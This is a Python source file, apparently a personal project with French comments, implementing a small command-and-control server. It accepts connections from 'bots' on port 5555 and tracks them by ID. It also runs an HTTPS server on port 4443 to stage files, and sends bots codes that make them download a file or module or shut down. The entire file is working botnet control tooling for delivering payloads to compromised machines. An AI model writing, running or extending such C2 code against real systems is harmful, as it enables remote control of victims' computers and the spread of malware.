import socket #communication
import threading #thread is thread
import json # for get socket bot 
from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler # for https server
import ssl
from shutil import copyfile #to copy file for upload






conn_list={} #dictionnaire pour stocker id et socks du client.
httpd = '' # réutiliser la variable pour stopper le serveur

def banner():
    print("===Bienvenue sur le C2 de Thomas===")
    print("Type help or ? for options\n")

def https_server(command):
	if command == "start":
		global httpd
		#openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
		print('[+] Setting up the https server')
		httpd = HTTPServer(('0.0.0.0', 4443), SimpleHTTPRequestHandler)

		httpd.socket = ssl.wrap_socket (httpd.socket, certfile='/home/kali/Desktop/ssl/server.pem', server_side=True)
		httpd.serve_forever()
		
	elif command == "stop":
		print ("[+] Stopping the https server ...")
		httpd.shutdown()
		httpd.server_close()
		return 0

def prepare_upload(filetoupload):
	dst = "/home/kali/Desktop" # is where the https server is listening
	thefile = filetoupload.split('/')[-1]
	print(thefile)
	copyfile(filetoupload, dst+'/'+thefile)

def server():
    print("[+] Server Started\n")
    global conn_list
    HOST = '0.0.0.0'                 # Symbolic name meaning all available interfaces
    PORT = 5555            # Arbitrary non-privileged port
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        id_client=""
        if conn:

            id_client=conn.recv(4098).decode('utf-8')
            #conn.send(b'test\x00') envoie test
            if id_client:
                if id_client in conn_list:
                    print("\n[*] Bot Online: {}\n".format(id_client))
                else:
                    print("\n[+] Bot Added: {}\n".format(id_client))
                    conn_list[id_client]=conn


def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}".format(count,key))

    else:
        print("No bots connected")

def interract():
    global conn_list
    print(conn_list)
    print(str(list(conn_list.keys())))
    print("Avec quel bots souhaitez vous interagir? ")
    client()
    interaction = int(input("ID bots: "))
    print(interaction)
    print(list(conn_list.keys())[interaction-1])
    print ('\n')
    #if str(interaction) in str(list(conn_list.keys())):
    if list(conn_list.keys())[interaction-1]:
        botid = list(conn_list.keys())[interaction-1]
        botsocket = conn_list[list(conn_list.keys())[interaction-1]]
        uploadstring = "1\x00"
        killclientstring = "3\x00"
        notvalid = "2\x00"
    else:
        print('no client found')
        return 0
    print("Type help or ? for options\n")
    while True:
        choice=input(str(botid)+': ')
        if choice=='s' or choice == 'send':
            print('[+] Sending message...')
            botsocket.send(notvalid.encode())
        if choice=='u' or choice == 'upload':
			#print("------ merci de vérifier si le serveur https est active ------")
            pathtoupload = input("Quel fichier souhaitez vous uploader (root path): ")
            filetoupload= pathtoupload.split('/')[-1]
            prepare_upload(pathtoupload)
            botsocket.send(uploadstring.encode())
            botsocket.send(filetoupload.encode())
            
        if choice=='k' or choice == 'kill':
            botsocket.send(killclientstring.encode())
            print("[+] Removing bot from list...")
            conn_list.pop(botid)
            return 0
            
        elif choice =='help' or choice =='?':
            print("\n==========\n"
            "send or s : To send a message\n"
            "upload or u : Upload a file or a module on target \n"
            "kill or k : Kill the client\n"
            "exit or q : To return C2 main menu\n==========")
        elif choice =='exit' or choice =='q':
            return 0
        else:
            pass
        





def main():
    banner()
    threading.Thread(target=server).start()
    
    while True:
        choice=input("C2: ")
        if choice=='list_bots' or choice =='l':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice=='i':
            p=threading.Thread(target=interract)
            p.start()
            p.join()
        elif choice=='https':
            command =input("\'start\' or \'stop\' the https server: ")
            p=threading.Thread(target=https_server, args=(command,))
            p.start()
        elif choice =='help' or choice =='?':
            print("==========\nlist_bots or l :To check for available bots online\ninteract or i :To interact with a target\nhttps : To set https server listening\n==========")
        else:
            pass
            


main()
